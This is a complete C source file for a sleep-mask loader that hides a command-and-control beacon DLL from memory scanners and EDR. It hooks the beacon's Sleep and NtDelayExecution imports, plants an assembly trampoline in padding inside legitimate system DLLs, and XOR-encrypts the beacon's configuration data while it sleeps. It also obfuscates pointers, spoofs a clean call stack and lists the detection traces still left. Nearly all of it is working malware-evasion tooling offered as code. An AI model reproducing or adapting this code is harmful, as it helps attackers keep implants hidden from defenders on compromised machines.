// x86_64-w64-mingw32-gcc -shared -Wall -Wextra -fcf-protection -o beacon.dll beacon.c -lntdll
// x86_64-w64-mingw32-gcc -Wall -Wextra -fcf-protection -o faulty.exe faulty.c
//
// faulty: the IAT-hook trampoline, data-region variant.
//
// Prior sleep masks encrypt the code region because the beacon IS
// shellcode.  A DLL beacon is a different shape: its code pages are
// MEM_IMAGE-backed and match on disk, so the scanner's code heuristic
// already passes.  The detection surface is the C2 config and string
// table in .data (what YARA and config extractors match on).
//
// This version masks the beacon's .data section during sleep:
//
//     mask(data); RealSleep(ms); decrypt(data); ret
//
// Same 83-byte trampoline, same IAT hook, different target region.
// Three prior residuals close:
//
//   - Stack: beacon_main's frame points into .text that stays RX
//     and matches on-disk.  No frame into a masked region.
//   - Execute: .text keeps RX for the whole sleep window.
//   - ETW churn: .data is already RW, so no NtProtectVirtualMemory.
//
// The XOR pass skips the IAT range (must stay readable so the
// hooked import resolves on the next call).
//
// Refcount + wake ordering: multiple threads can hit the hooked sleep.
// First in masks; the first waker decrypts (the beacon is active, so the
// data must be readable by the time any waker resumes beacon code).
// sleepers is the refcount; state is a 3-valued latch:
//   0 = plain, 1 = masked, 2 = unmask in flight.
// The waker that CASes state 1->2 performs the unmask.  Concurrent
// wakers that lose the latch spin on state==2 until it completes, so no
// thread reads .data mid-unmask. That closes the unmask-completion race
// the single-thread path couldn't show.  The mask side has no in-flight
// state: a later sleeper can only wake once its own sleep has elapsed, so
// it always lands after the first sleeper's mask already finished.  That
// ordering is guaranteed by sleep duration, not the latch.
//
// Sleep targets: Sleep/SleepEx share trampoline A (calls fn_sleep, the
// kernel32 original; a SleepEx alertable bit is dropped, matching the
// single-stub design).  NtDelayExecution has a different signature and
// return, so it gets trampoline B (calls fn_ntdelay, the ntdll original).
// Both point at the same state struct (one masked region, one key, one
// refcount) and differ only in which real sleep they invoke.
//
// While sleeping the stack reads:
//
//     ntdll <- kernel32!Sleep <- trampoline (host .text) <- beacon_main
//
// beacon_main's frame points into .text (RX, on-disk match).
// The loader binary is in none of those frames.
//
// Still visible:
//   (a) the patched IAT entry;
//   (b) the trampoline byte-diff in the host (ModifiedModule);
//   (c) raw state pointer sitting in the trampoline code;
//   (d) heap C2 buffers, scoped out of the mask; the beacon zeroes each
//       after use so it doesn't sit at rest (a buffer that outlives its use
//       would still be visible);
//   (e) a private-RW VAD when no host .data slot turns up;
//   (f) the beacon DLL itself (on disk or stomped).
//
// Demo: beacon.dll is a representative C2 beacon, with a main loop (Sleep)
// and a worker thread (NtDelayExecution), each doing C2 work on a heap
// buffer it zeroes after use.  The scanner thread watches the config byte
// and the mask state.  Neither ships.
//
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>

// ---- state: function pointers for the trampoline + masking metadata ----------
typedef struct {
    void *fn_mask;                       // +0x00  tramp: call [rbx+0x00]
    void *fn_sleep;                      // +0x08  tramp A: call [rbx+0x08]
    void *fn_decrypt;                    // +0x10  tramp: call [rbx+0x10]
    void *fn_ntdelay;                    // +0x18  tramp B: call [rbx+0x18]
    void *region;                        // +0x20  beacon .data base
    size_t region_len;                   // +0x28  beacon .data length
    volatile LONG state;                 // +0x30  0=plain 1=masked 2=unmasking
    volatile LONG sleepers;              // +0x34  threads currently in sleep
    unsigned char key[16];               // +0x38  only valid while masked
    unsigned char *iat_base;             // +0x48  IAT start (NULL = no overlap)
    size_t iat_len;                      // +0x50  IAT byte length
} beacon_state;
_Static_assert(offsetof(beacon_state, fn_mask)    == 0x00, "tramp call [rbx+0x00]");
_Static_assert(offsetof(beacon_state, fn_sleep)   == 0x08, "tramp A call [rbx+0x08]");
_Static_assert(offsetof(beacon_state, fn_decrypt) == 0x10, "tramp call [rbx+0x10]");
_Static_assert(offsetof(beacon_state, fn_ntdelay) == 0x18, "tramp B call [rbx+0x18]");

// ---- sleep targets: which IAT imports to hook --------------------------------
// Sleep/SleepEx share trampoline A (signature-compatible; the trampoline
// preserves all four arg regs).  NtDelayExecution has a different signature
// and return, so it gets trampoline B.  WFSO would need its own trampoline;
// the demo beacon doesn't import it, so it's not added.
typedef struct { const char *dll; const char *func; } sleep_target;
static const sleep_target TARGETS[] = {
    { "kernel32.dll", "Sleep" },
    { "kernel32.dll", "SleepEx" },
    { "ntdll.dll",    "NtDelayExecution" },
};
#define NTARGETS (int)(sizeof TARGETS / sizeof TARGETS[0])

// ---- host modules: already loaded, padding not prologues ---------------------
static const char *HOSTS[] = { "combase.dll", "rpcrt4.dll", "ucrtbase.dll" };
#define NHOSTS (int)(sizeof HOSTS / sizeof HOSTS[0])

// ---- obfuscated state pointer ------------------------------------------------
static unsigned char g_cookie[8];
static unsigned long long g_desc_obf;
#define DESC() ((beacon_state *)(uintptr_t)(g_desc_obf ^ (*(unsigned long long *)g_cookie & 0x0000FFFFFFFFFFFFULL)))

// ---- NtProtectVirtualMemory: still needed for trampoline page setup ----------
typedef LONG (NTAPI *NtProtect_t)(HANDLE, PVOID *, SIZE_T *, ULONG, ULONG *);
static NtProtect_t pNtProtectVirtualMemory;
static int vp(void *base, size_t len, DWORD prot) {
    PVOID b = base; SIZE_T n = len; DWORD old;
    if (pNtProtectVirtualMemory)
        return pNtProtectVirtualMemory(GetCurrentProcess(), &b, &n, prot, &old) >= 0;
    return VirtualProtect(base, len, prot, &old);
}

// ---- CSPRNG: OS entropy per cycle --------------------------------------------
typedef void (NTAPI *ProcessPrng_t)(PVOID, size_t);
static ProcessPrng_t pProcessPrng;

// ---- XOR the data region, skipping the IAT if it overlaps --------------------
static void xor_region(beacon_state *d) {
    unsigned char *base = (unsigned char *)d->region;
    size_t len = d->region_len;

    if (d->iat_base && d->iat_base >= base && d->iat_base < base + len) {
        size_t before = (size_t)(d->iat_base - base);
        size_t skip_end = before + d->iat_len;
        if (skip_end > len) skip_end = len;
        for (size_t i = 0; i < before; i++)
            base[i] ^= d->key[i % 16];
        for (size_t i = skip_end; i < len; i++)
            base[i] ^= d->key[i % 16];
    } else {
        for (size_t i = 0; i < len; i++)
            base[i] ^= d->key[i % 16];
    }
}

// ---- mask / decrypt: refcounted, no VirtualProtect (.data is already RW) -----
// state: 0=plain 1=masked 2=unmask-in-flight.  First sleeper masks; first
// waker unmasks; concurrent wakers spin on state==2 until the unmask is done,
// so no thread reads .data mid-XOR (closes the XOR-completion race).
static void mask(void) {
    beacon_state *d = DESC();
    if (InterlockedIncrement(&d->sleepers) != 1) return;
    pProcessPrng(d->key, sizeof d->key);
    xor_region(d);
    InterlockedExchange(&d->state, 1);
}

static void decrypt(void) {
    beacon_state *d = DESC();
    InterlockedDecrement(&d->sleepers);
    if (InterlockedCompareExchange(&d->state, 2, 1) == 1) {
        // Won the latch (1 -> 2): I perform the unmask.  state==2 tells
        // concurrent wakers to hold until this pass completes.
        xor_region(d);
        SecureZeroMemory(d->key, sizeof d->key);
        InterlockedExchange(&d->state, 0);          // 2 -> plain
    } else {
        // Lost: state is 2 (unmask in flight) or 0 (already plain).  Spin
        // until the decrypter finishes so I read fully-unmasked .data.
        while (d->state == 2) YieldProcessor();
    }
}

// ---- trampoline (83 bytes) ---------------------------------------------------
// Saves rcx/rdx/r8/r9, calls mask(), restores args for the real sleep,
// stashes rax, calls decrypt(), restores rax, returns.  State pointer
// patched as imm64 at offset 11.
//
//   +0  F3 0F 1E FA   endbr64           IBT landing pad
//   +4  53            push  rbx          callee-save + 16-align rsp
//   +5  48 83 EC 40   sub   rsp, 0x40   shadow (0x20) + save area (0x20)
//   +9  48 BB <imm64> mov   rbx, <state> patched at setup
//  +19  48 89 4C 24 20 mov  [rsp+0x20], rcx   save arg1
//  +24  48 89 54 24 28 mov  [rsp+0x28], rdx   save arg2
//  +29  4C 89 44 24 30 mov  [rsp+0x30], r8    save arg3
//  +34  4C 89 4C 24 38 mov  [rsp+0x38], r9    save arg4
//  +39  FF 13          call [rbx+0x00]         mask()
//  +41  48 8B 4C 24 20 mov  rcx, [rsp+0x20]   restore args
//  +46  48 8B 54 24 28 mov  rdx, [rsp+0x28]
//  +51  4C 8B 44 24 30 mov  r8,  [rsp+0x30]
//  +56  4C 8B 4C 24 38 mov  r9,  [rsp+0x38]
//  +61  FF 53 08       call [rbx+0x08]         real sleep
//  +64  48 89 44 24 20 mov  [rsp+0x20], rax   save retval
//  +69  FF 53 10       call [rbx+0x10]         decrypt()
//  +72  48 8B 44 24 20 mov  rax, [rsp+0x20]   restore retval
//  +77  48 83 C4 40    add  rsp, 0x40
//  +81  5B             pop  rbx
//  +82  C3             ret                     -> beacon, plain + RX
static const unsigned char TRAMP[] = {
    0xF3,0x0F,0x1E,0xFA,
    0x53,
    0x48,0x83,0xEC,0x40,
    0x48,0xBB, 0,0,0,0,0,0,0,0,
    0x48,0x89,0x4C,0x24,0x20,
    0x48,0x89,0x54,0x24,0x28,
    0x4C,0x89,0x44,0x24,0x30,
    0x4C,0x89,0x4C,0x24,0x38,
    0xFF,0x13,
    0x48,0x8B,0x4C,0x24,0x20,
    0x48,0x8B,0x54,0x24,0x28,
    0x4C,0x8B,0x44,0x24,0x30,
    0x4C,0x8B,0x4C,0x24,0x38,
    0xFF,0x53,0x08,
    0x48,0x89,0x44,0x24,0x20,
    0xFF,0x53,0x10,
    0x48,0x8B,0x44,0x24,0x20,
    0x48,0x83,0xC4,0x40,
    0x5B,
    0xC3,
};
#define TRAMP_LEN       (sizeof TRAMP)
#define TRAMP_STATE_OFF 11     // imm64 of `mov rbx, <state>`
#define TRAMP_SLEEP_OP  63    // operand of `call [rbx+0x08]`; 0x18 for tramp B
_Static_assert(sizeof TRAMP == 83, "trampoline length pinned");

// ---- find a padding run (0xCC or 0x90) in a code section ---------------------
static int find_run(unsigned char *p, DWORD vs, DWORD need, unsigned char **out) {
    DWORD run = 0;
    for (DWORD j = 0; j < vs; j++) {
        if (p[j] == 0xCC || p[j] == 0x90) {
            if (++run >= need) { *out = p + j - need + 1; return 1; }
        } else run = 0;
    }
    return 0;
}

// ---- find a trampoline slot in a host .text ----------------------------------
static int find_tramp_slot(unsigned char **tramp_out) {
    for (int h = 0; h < NHOSTS; h++) {
        HMODULE m = GetModuleHandleA(HOSTS[h]);
        if (!m) m = LoadLibraryA(HOSTS[h]);
        if (!m) continue;
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)m;
        IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)m + dos->e_lfanew);
        IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
            if (!(s->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
            if (find_run((unsigned char *)m + s->VirtualAddress,
                         s->Misc.VirtualSize, (DWORD)(2 * TRAMP_LEN), tramp_out))
                return 1;
        }
    }
    return 0;
}

// ---- find a zero run in a host .data (RW, MEM_IMAGE) -------------------------
static void *find_data_slot(size_t need) {
    for (int h = 0; h < NHOSTS; h++) {
        HMODULE m = GetModuleHandleA(HOSTS[h]);
        if (!m) m = LoadLibraryA(HOSTS[h]);
        if (!m) continue;
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)m;
        IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)m + dos->e_lfanew);
        IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
        for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
            if (!(s->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)) continue;
            if (!(s->Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
            unsigned char *base = (unsigned char *)m + s->VirtualAddress;
            DWORD sz = s->Misc.VirtualSize, run = 0;
            for (DWORD j = 0; j < sz; j++) {
                if (base[j] == 0) { if (++run >= need) return base + j - need + 1; }
                else run = 0;
            }
        }
    }
    return NULL;
}

// ---- one-time write to a .text page: temp-RW, memcpy, restore ---------------
static int write_text(void *dst, const void *src, size_t n) {
    DWORD old;
    if (!VirtualProtect(dst, n, PAGE_READWRITE, &old)) return 0;
    memcpy(dst, src, n);
    DWORD tmp;
    VirtualProtect(dst, n, old, &tmp);
    return 1;
}

// ---- IAT hook: patch one import entry to point at the trampoline -------------
static int hook_iat(HMODULE mod, const char *dll_name, const char *func_name,
                    void *hook, void **original) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mod;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)mod + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!dir->VirtualAddress) return 0;

    IMAGE_IMPORT_DESCRIPTOR *imp =
        (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)mod + dir->VirtualAddress);
    for (; imp->Name; imp++) {
        if (_stricmp((const char *)((BYTE *)mod + imp->Name), dll_name) != 0)
            continue;
        DWORD hint_rva = imp->OriginalFirstThunk
                       ? imp->OriginalFirstThunk : imp->FirstThunk;
        IMAGE_THUNK_DATA *hint =
            (IMAGE_THUNK_DATA *)((BYTE *)mod + hint_rva);
        IMAGE_THUNK_DATA *iat  =
            (IMAGE_THUNK_DATA *)((BYTE *)mod + imp->FirstThunk);

        for (; hint->u1.AddressOfData; hint++, iat++) {
            if (IMAGE_SNAP_BY_ORDINAL(hint->u1.Ordinal)) continue;
            IMAGE_IMPORT_BY_NAME *name = (IMAGE_IMPORT_BY_NAME *)
                ((BYTE *)mod + hint->u1.AddressOfData);
            if (strcmp((const char *)name->Name, func_name) != 0) continue;

            *original = (void *)(uintptr_t)iat->u1.Function;
            DWORD old;
            VirtualProtect(&iat->u1.Function, sizeof(void *),
                           PAGE_READWRITE, &old);
            iat->u1.Function = (ULONG_PTR)hook;
            DWORD tmp;
            VirtualProtect(&iat->u1.Function, sizeof(void *), old, &tmp);
            return 1;
        }
    }
    return 0;
}

// ---- locate the beacon's first writable data section -------------------------
static int find_beacon_data(HMODULE mod, void **base, size_t *len) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mod;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)mod + dos->e_lfanew);
    IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (!(s->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA)) continue;
        if (!(s->Characteristics & IMAGE_SCN_MEM_WRITE)) continue;
        *base = (unsigned char *)mod + s->VirtualAddress;
        *len  = s->Misc.VirtualSize;
        return 1;
    }
    return 0;
}

// ---- locate the IAT bounds (for exclusion from the XOR pass) -----------------
static int find_iat_range(HMODULE mod, unsigned char **base, size_t *len) {
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mod;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)mod + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY *dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT];
    if (!dir->VirtualAddress || !dir->Size) return 0;
    *base = (unsigned char *)mod + dir->VirtualAddress;
    *len  = dir->Size;
    return 1;
}

// ---- scanner (DEMO ONLY) -----------------------------------------------------
// Stands in for a memory scanner / EDR.  The mask state is the reliable
// indicator; the config byte is just color, read from beacon_config at its
// own address (not .data[0]).  'C' means plain; anything else is ciphertext.
// The sleepers count shows the refcount holding as both threads (Sleep +
// NtDelayExecution) enter the window.
typedef struct {
    volatile unsigned long long *ticks;
    unsigned char *config;      // beacon_config[0]; 'C' when plain
} scan_args;

DWORD WINAPI scanner(LPVOID a) {
    scan_args *sa = (scan_args *)a;
    beacon_state *d = DESC();
    int last_state = -1; long last_sleepers = -1;
    unsigned long long last_tick = 0;
    for (;;) {
        unsigned char cb = 0;
        if (sa->config)
            ReadProcessMemory(GetCurrentProcess(), sa->config, &cb, 1, NULL);
        int state = (int)d->state;
        long sleepers = d->sleepers;
        unsigned long long tick = sa->ticks ? *sa->ticks : 0;
        if (state != last_state || sleepers != last_sleepers ||
            tick != last_tick) {
            const char *sname = state == 1 ? "MASKED"
                            : state == 2 ? "UNMASKING" : "PLAIN";
            printf("[scan]  %-9s  config=%02x (%s)  sleepers=%ld  tick=%llu\n",
                   sname, cb,
                   (sa->config && cb == 'C') ? "plaintext" : "ciphertext",
                   sleepers, tick);
            last_state = state; last_sleepers = sleepers; last_tick = tick;
        }
        Sleep(30);
    }
    return 0;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    // ---- resolve imports -----------------------------------------------------
    pNtProtectVirtualMemory = (NtProtect_t)(void *)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    pProcessPrng = (ProcessPrng_t)(void *)GetProcAddress(
        LoadLibraryA("bcryptprimitives.dll"), "ProcessPrng");
    if (!pProcessPrng) {
        printf("[setup]  ProcessPrng resolve failed\n");
        return 1;
    }

    // ---- cookie for obfuscated state pointer ---------------------------------
    pProcessPrng(g_cookie, sizeof g_cookie);
    unsigned long long ck; memcpy(&ck, g_cookie, 8);
    ck &= 0x0000FFFFFFFFFFFFULL;

    // ---- load the beacon DLL -------------------------------------------------
    HMODULE hBeacon = LoadLibraryA("beacon.dll");
    if (!hBeacon) {
        printf("[setup]  failed to load beacon.dll (%lu)\n", GetLastError());
        return 1;
    }
    typedef void (*beacon_main_t)(void);
    beacon_main_t pfnBeacon =
        (beacon_main_t)(void *)GetProcAddress(hBeacon, "beacon_main");
    volatile unsigned long long *ticks = (volatile unsigned long long *)
        GetProcAddress(hBeacon, "beacon_tick_count");
    if (!pfnBeacon) {
        printf("[setup]  beacon_main export not found\n");
        return 1;
    }

    // ---- find the beacon's .data (the region we'll mask) ---------------------
    void *beacon_data = NULL; size_t beacon_data_len = 0;
    if (!find_beacon_data(hBeacon, &beacon_data, &beacon_data_len)) {
        printf("[setup]  beacon .data section not found\n");
        return 1;
    }

    // ---- find the IAT range (excluded from XOR if it overlaps .data) ---------
    unsigned char *iat_base = NULL; size_t iat_len = 0;
    find_iat_range(hBeacon, &iat_base, &iat_len);

    // ---- trampoline: host .text padding (preferred) or private page ----------
    unsigned char *tramp_slot = NULL;
    int tramp_image = find_tramp_slot(&tramp_slot);
    if (!tramp_image) {
        printf("[setup]  no %u-byte padding run; private trampoline fallback\n",
               (unsigned)TRAMP_LEN);
        tramp_slot = VirtualAlloc(NULL, 0x1000,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!tramp_slot) {
            printf("[setup]  trampoline alloc failed\n");
            return 1;
        }
    }

    // ---- state: host .data padding (MEM_IMAGE) or private RW -----------------
    beacon_state *st = (beacon_state *)find_data_slot(sizeof(beacon_state));
    int state_image = (st != NULL);
    if (!st)
        st = (beacon_state *)VirtualAlloc(NULL, 0x1000,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE);
    if (!st) {
        printf("[setup]  state alloc failed\n");
        return 1;
    }
    g_desc_obf = (unsigned long long)(uintptr_t)st ^ ck;

    // ---- populate state (fn_sleep/fn_ntdelay filled by hook_iat below) ------
    st->fn_mask    = (void *)mask;
    st->fn_sleep   = NULL;
    st->fn_ntdelay = NULL;
    st->fn_decrypt = (void *)decrypt;
    st->region     = beacon_data;
    st->region_len = beacon_data_len;
    st->state      = 0;
    st->sleepers   = 0;
    memset(st->key, 0, sizeof st->key);
    st->iat_base   = iat_base;
    st->iat_len    = iat_len;

    // ---- build both trampolines with patched state pointer -------------------
    // tramp A at slot+0 (call [rbx+0x08] = fn_sleep); tramp B at slot+0x53
    // (call [rbx+0x18] = fn_ntdelay).  They share the state struct and differ
    // only in the sleep-call operand (TRAMP_SLEEP_OP).
    uintptr_t st_addr = (uintptr_t)st;
    unsigned char *trampA = tramp_slot;
    unsigned char *trampB = tramp_slot + TRAMP_LEN;
    // Guard: TRAMP_SLEEP_OP must be the displacement byte of `call [rbx+...]`
    // (preceded by the FF 53 opcode+modrm).  C static_assert can't subscript an
    // array, so this is checked at setup: editing the trampoline and drifting
    // the operand past offset 63 fails here instead of silently.
    if (TRAMP[TRAMP_SLEEP_OP - 2] != 0xFF || TRAMP[TRAMP_SLEEP_OP - 1] != 0x53) {
        printf("[setup]  trampoline layout drift: operand not at TRAMP_SLEEP_OP\n");
        return 1;
    }
    for (int t = 0; t < 2; t++) {
        unsigned char code[sizeof TRAMP];
        memcpy(code, TRAMP, sizeof TRAMP);
        memcpy(code + TRAMP_STATE_OFF, &st_addr, 8);
        code[TRAMP_SLEEP_OP] = t ? 0x18 : 0x08;
        unsigned char *dst = t ? trampB : trampA;
        if (tramp_image) {
            if (!write_text(dst, code, TRAMP_LEN)) {
                printf("[setup]  trampoline write to host .text failed\n");
                return 1;
            }
        } else {
            memcpy(dst, code, TRAMP_LEN);
        }
    }
    if (!tramp_image &&
        !vp(tramp_slot, 2 * TRAMP_LEN, PAGE_EXECUTE_READ)) {
        printf("[setup]  trampoline page flip failed\n");
        return 1;
    }

    // ---- hook each sleep import to its trampoline ----------------------------
    // Sleep/SleepEx -> tramp A (store first original in fn_sleep);
    // NtDelayExecution -> tramp B (store original in fn_ntdelay).
    void *real_sleep = NULL;
    void *real_ntdelay = NULL;
    int hooked = 0;
    for (int t = 0; t < NTARGETS; t++) {
        int is_nt = (strcmp(TARGETS[t].func, "NtDelayExecution") == 0);
        void *tramp = is_nt ? trampB : trampA;
        void **real_slot = is_nt ? &real_ntdelay : &real_sleep;
        void *orig = NULL;
        if (hook_iat(hBeacon, TARGETS[t].dll, TARGETS[t].func, tramp, &orig)) {
            if (!*real_slot) *real_slot = orig;
            hooked++;
            printf("[setup]  hooked %s!%s -> trampoline %s\n",
                   TARGETS[t].dll, TARGETS[t].func, is_nt ? "B" : "A");
        }
    }
    if (!hooked) {
        printf("[setup]  no hookable sleep import found in beacon IAT\n");
        return 1;
    }
    st->fn_sleep   = real_sleep;
    st->fn_ntdelay = real_ntdelay;

    // ---- sanity: state must not overlap the masked data region ---------------
    uintptr_t rgn_start = (uintptr_t)beacon_data;
    uintptr_t rgn_end   = rgn_start + beacon_data_len;
    uintptr_t st_start  = (uintptr_t)st;
    uintptr_t st_end    = st_start + sizeof(beacon_state);
    if (st_start < rgn_end && st_end > rgn_start) {
        printf("[setup]  BUG: state struct overlaps masked data region\n");
        return 1;
    }

    printf("[setup]  region %p (%llu bytes, beacon .data), state %p (%s)\n",
           beacon_data, (unsigned long long)beacon_data_len,
           (void *)st, state_image ? "image .data" : "private RW");
    printf("[setup]  tramp A %p (Sleep/SleepEx)   B %p (NtDelayExecution)%s\n",
           (void *)trampA, (void *)trampB, tramp_image ? "" : "  [private]");
    printf("[setup]  data masked during sleep; .text stays RX; "
           "3-state latch + spin-wait; refcounted sleepers\n");

    if (iat_base) {
        int overlaps = (iat_base >= (unsigned char *)beacon_data &&
                        iat_base < (unsigned char *)beacon_data + beacon_data_len);
        if (overlaps)
            printf("[setup]  IAT at %p (%llu bytes) overlaps .data; "
                   "excluded from mask\n",
                   (void *)iat_base, (unsigned long long)iat_len);
    }

    // ---- launch --------------------------------------------------------------
    scan_args sa;
    sa.ticks  = ticks;
    sa.config = (unsigned char *)GetProcAddress(hBeacon, "beacon_config");
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pfnBeacon, NULL, 0, NULL);
    CreateThread(NULL, 0, scanner, (LPVOID)&sa, 0, NULL);

    Sleep(20000);
    return 0;
}
